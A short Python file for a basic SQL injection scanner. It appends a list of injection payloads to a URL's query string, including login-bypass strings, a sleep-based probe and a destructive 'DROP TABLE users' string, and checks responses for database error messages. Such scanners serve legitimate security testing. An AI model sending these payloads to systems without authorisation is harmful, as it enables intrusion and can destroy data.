# === scanner/sqli_scanner.py ===
import requests

def scan(url):
    payloads = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR '1'='1' --",
        "'; DROP TABLE users;--",
        "' OR 1=1#",
        "' OR '1'='1'/*",
        "' OR sleep(5)--",
        "admin'--",
        "' OR 1=1 LIMIT 1--"
    ]

    error_signatures = [
        "you have an error in your sql syntax",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "sql error",
        "mysql_fetch",
        "pg_query",
        "ora-01756",
        "microsoft odbc",
        "invalid query",
        "near",
        "syntax error",
        "unexpected token"
    ]

    if "=" not in url:
        return False

    for payload in payloads:
        try:
            test_url = url + payload
            res = requests.get(test_url, timeout=5)
            for error in error_signatures:
                if error in res.text.lower():
                    print(f"[!] Potential SQLi detected with payload: {payload}")
                    return True
        except Exception as e:
            continue

    return False
